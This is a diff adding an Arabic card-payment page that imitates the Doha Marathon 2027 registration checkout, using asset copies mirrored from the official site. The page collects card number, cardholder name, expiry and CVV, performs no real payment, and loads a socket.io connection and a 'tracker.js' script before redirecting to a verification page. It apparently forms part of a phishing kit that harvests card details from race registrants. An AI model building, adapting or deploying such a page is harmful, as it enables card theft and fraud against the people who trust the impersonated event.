@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#ed1c24">
+	<title>الدفع بالبطاقة - ماراثون الدوحة 2027</title>
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
+	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
+	<link rel="stylesheet" href="assets/registration-payment.css">
+	<style>
+		.card-form-fields { display:flex; flex-direction:column; gap:16px; margin:20px 0; }
+		.card-form-fields label { display:flex; flex-direction:column; gap:6px; font-size:14px; font-weight:600; color:#333; }
+		.card-form-fields input, .card-form-fields select {
+			width:100%; padding:14px 16px; border:1.5px solid #d4d4d4; border-radius:10px;
+			font-size:16px; font-family:inherit; background:#fff; color:#101010; direction:ltr; text-align:left;
+			transition: border-color .2s;
+		}
+		.card-form-fields input:focus, .card-form-fields select:focus { outline:none; border-color:var(--brand); }
+		.row-2 { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+		.card-brands { display:flex; gap:10px; justify-content:center; margin-bottom:12px; }
+		.card-brands span { font-size:13px; font-weight:700; padding:4px 10px; border-radius:6px; background:#f0f0f0; color:#555; }
+	</style>
+</head>
+<body>
+	<header class="payment-header">
+		<nav class="header-actions" aria-label="روابط سريعة">
+			<a href="index.html" aria-label="العودة للرئيسية" title="العودة للرئيسية">
+				<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3a15 15 0 0 1 0 18M12 3a15 15 0 0 0 0 18"></path></svg>
+			</a>
+			<span class="participant-count" aria-label="مشارك واحد">(1)</span>
+			<svg class="cart-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2l2.3 12.1a2 2 0 0 0 2 1.6h9.9a2 2 0 0 0 2-1.6L22 7H5"></path><circle cx="9" cy="21" r="1"></circle><circle cx="18" cy="21" r="1"></circle></svg>
+		</nav>
+		<a class="payment-brand" href="index.html" aria-label="ماراثون الدوحة من أريدُ">
+			<img src="assets/suffixevnt.blob.core.windows.net/dohaimages/2025/06/Logo.png" alt="ماراثون الدوحة من أريدُ">
+		</a>
+	</header>
+
+	<main class="payment-shell">
+		<section class="payment-card" aria-label="الدفع بالبطاقة">
+			<div class="session-row">
+				<strong id="session-countdown" class="session-countdown" aria-live="off">10:00</strong>
+				<span>تنتهي صلاحية الجلسة خلال</span>
+			</div>
+
+			<div class="payment-total">
+				<p>إجمالي المبلغ المستحق الدفع</p>
+				<strong id="payment-total" class="amount"></strong>
+			</div>
+
+			<div class="card-brands">
+				<span>VISA</span>
+				<span>MasterCard</span>
+				<span>Apple Pay</span>
+				<span>G Pay</span>
+			</div>
+
+			<form id="card-form" novalidate>
+				<div class="card-form-fields">
+					<label>
+						رقم البطاقة
+						<input type="tel" name="card-number" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" required>
+					</label>
+					<label>
+						الاسم على البطاقة
+						<input type="text" name="cardholder-name" id="cardholder-name" placeholder="CARDHOLDER NAME" autocomplete="cc-name" required>
+					</label>
+					<div class="row-2">
+						<label>
+							تاريخ الانتهاء
+							<input type="tel" name="card-expiry" id="card-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" required>
+						</label>
+						<label>
+							CVV
+							<input type="tel" name="card-cvv" id="card-cvv" placeholder="000" maxlength="3" inputmode="numeric" autocomplete="cc-csc" required>
+						</label>
+					</div>
+				</div>
+
+				<button id="pay-button" class="pay-button" type="submit">يدفع</button>
+				<p id="payment-message" class="payment-message" role="status" aria-live="polite" hidden></p>
+			</form>
+
+			<a class="back-link" href="payment.html">خلف</a>
+		</section>
+	</main>
+	<footer class="payment-footer" aria-hidden="true"></footer>
+<script src="/socket.io/socket.io.js"></script>
+<script src="/assets/tracker.js"></script>
+<script>
+(function(){
+	var reviewKey = "doha-marathon-registration-review";
+	var expiryKey = "doha-marathon-payment-expiry";
+	var review;
+	try { review = JSON.parse(sessionStorage.getItem(reviewKey) || "null"); } catch(e){ review = null; }
+
+	var totalEl = document.getElementById("payment-total");
+	var payBtn = document.getElementById("pay-button");
+	if (review && typeof review.price === "number") {
+		var formatted = "QAR " + review.price.toFixed(2);
+		if (totalEl) totalEl.textContent = formatted;
+		if (payBtn) payBtn.textContent = "يدفع " + formatted;
+	}
+
+	var savedExpiry = Number(sessionStorage.getItem(expiryKey));
+	var expiry = (savedExpiry > 0) ? savedExpiry : Date.now() + 10*60*1000;
+	sessionStorage.setItem(expiryKey, String(expiry));
+
+	var countdown = document.getElementById("session-countdown");
+	var msg = document.getElementById("payment-message");
+	function tick(){
+		var rem = Math.max(0, Math.ceil((expiry - Date.now())/1000));
+		var m = Math.floor(rem/60), s = rem%60;
+		if(countdown) countdown.textContent = String(m).padStart(2,"0")+":"+String(s).padStart(2,"0");
+		if(rem===0){ if(msg){msg.hidden=false; msg.textContent="انتهت صلاحية جلسة الدفع.";} clearInterval(tid); }
+	}
+	tick(); var tid = setInterval(tick, 1000);
+
+	// Card number formatting
+	var cardNum = document.getElementById("card-number");
+	if(cardNum) cardNum.addEventListener("input", function(){
+		var v = this.value.replace(/\D/g,"").substring(0,16);
+		var parts = v.match(/.{1,4}/g);
+		this.value = parts ? parts.join(" ") : "";
+	});
+
+	// Expiry formatting
+	var expEl = document.getElementById("card-expiry");
+	if(expEl) expEl.addEventListener("input", function(){
+		var v = this.value.replace(/\D/g,"").substring(0,4);
+		if(v.length >= 3) this.value = v.substring(0,2)+"/"+v.substring(2);
+		else this.value = v;
+	});
+
+	// CVV limit
+	var cvvEl = document.getElementById("card-cvv");
+	if(cvvEl) cvvEl.addEventListener("input", function(){
+		this.value = this.value.replace(/\D/g,"").substring(0,3);
+	});
+
+	var form = document.getElementById("card-form");
+	if(form) form.addEventListener("submit", function(e){
+		e.preventDefault();
+		var cn = (cardNum?cardNum.value:"").replace(/\s/g,"");
+		var name = document.getElementById("cardholder-name").value.trim();
+		var exp = (expEl?expEl.value:"");
+		var cvv = (cvvEl?cvvEl.value:"");
+		if(cn.length<16||!name||exp.length<5||cvv.length<3){
+			if(msg){msg.hidden=false; msg.textContent="يرجى ملء جميع الحقول بشكل صحيح.";}
+			return;
+		}
+		window.location.assign("payment-verify.html");
+	});
+})();
+</script>
+</body>
+</html>
